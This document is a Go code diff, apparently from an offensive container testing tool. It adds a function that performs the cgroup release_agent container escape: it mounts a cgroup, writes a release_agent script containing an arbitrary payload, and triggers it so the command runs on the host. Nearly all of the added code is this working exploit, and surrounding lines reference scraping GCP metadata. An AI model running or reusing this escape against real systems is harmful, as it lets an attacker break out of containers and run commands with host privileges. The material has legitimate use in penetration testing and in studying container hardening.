@@ -7,6 +7,7 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -20,6 +21,116 @@ import (
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/s3/s3manager"
 )
+
+func abuseCgroupPriv(payload string) {
+	fmt.Println("[+] Attempting to abuse CGROUP Privileges")
+	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
+	containerHome = strings.TrimSpace(containerHome)
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab'. ", err)
+	}
+
+	randomCgroupPath := generateRandomString(6)
+	randomCgroupChild := generateRandomString(6)
+
+	cgroupFullPath := fmt.Sprintf("/tmp/cgrp%s/%s", randomCgroupPath, randomCgroupChild)
+	cgroupPartialPath := fmt.Sprintf("/tmp/cgrp%s", randomCgroupPath)
+
+	cgroupController := "cpu"
+
+	if *verbosePtr {
+		fmt.Println("[*] CGROUP Location: ", cgroupFullPath)
+	}
+	_, err = execShellCmd("mkdir " + cgroupPartialPath)
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'mkdir "+cgroupPartialPath+"'.", err)
+		exitCode = 1
+		return
+	}
+
+	_, err = execShellCmd("mount -t cgroup -o " + cgroupController + " cgroup " + cgroupPartialPath)
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'mount -t cgroup -o "+cgroupController+" cgroup "+cgroupPartialPath+"'.", err)
+		exitCode = 1
+		return
+	}
+
+	_, err = execShellCmd("mkdir " + cgroupFullPath)
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'mkdir "+cgroupFullPath+"'.", err)
+		exitCode = 1
+		return
+	}
+	_, err = execShellCmd("echo 1 > " + cgroupFullPath + "/notify_on_release")
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'echo 1 > "+cgroupFullPath+"/notify_on_release'. ", err)
+		exitCode = 1
+		return
+	}
+
+	releaseAgentCommand := "echo " + containerHome + "/cmd > " + cgroupPartialPath + "/release_agent"
+	_, err = execShellCmd(releaseAgentCommand)
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> '"+releaseAgentCommand+"'. ", err)
+		exitCode = 1
+		return
+	}
+
+	_, err = execShellCmd("echo '#!/bin/sh' > /cmd")
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'echo '#!/bin/sh' > /cmd'. ", err)
+		exitCode = 1
+		return
+	}
+
+	// payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, strings.TrimSpace(containerHome))
+	payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, containerHome)
+
+	if *verbosePtr {
+		fmt.Println("[*] Payload provided: ", payloadString)
+	}
+
+	_, err = execShellCmd(payloadString)
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> '"+payloadString+"'. ", err)
+		exitCode = 1
+		return
+	}
+
+	_, err = execShellCmd("chmod a+x /cmd")
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'chmod a+x /cmd'. ", err)
+		exitCode = 1
+		return
+	}
+
+	_, err = execShellCmd("echo $$ > " + cgroupFullPath + "/cgroup.procs")
+
+	if err != nil {
+		fmt.Println("[ERROR] In -> 'echo $$ > "+cgroupFullPath+"/cgroup.procs'. ", err)
+		exitCode = 1
+		return
+	}
+
+	fmt.Println("[*] The result of your command can be found in /output")
+}
+
+func generateRandomString(len int) string {
+	rand.Seed(time.Now().UTC().UnixNano())
+	bytes := make([]byte, len)
+	for i := 0; i < len; i++ {
+		bytes[i] = byte(65 + rand.Intn(25))
+	}
+	return string(bytes)
+}
 
 func scrapeGcpMetadata(host, port string) (string, error) {
 	connStr := fmt.Sprintf("%s:%s", host, port)
@@ -260,7 +371,7 @@ func execShellCmd2(command string, args ...string) error {
 func execShellCmd(cmd string) (string, error) {
 	out, err := exec.Command("sh", "-c", cmd).Output()
 	if err != nil {
-		return "", err
+		return string(out[:]), err
 	}
 	return string(out[:]), nil
 }
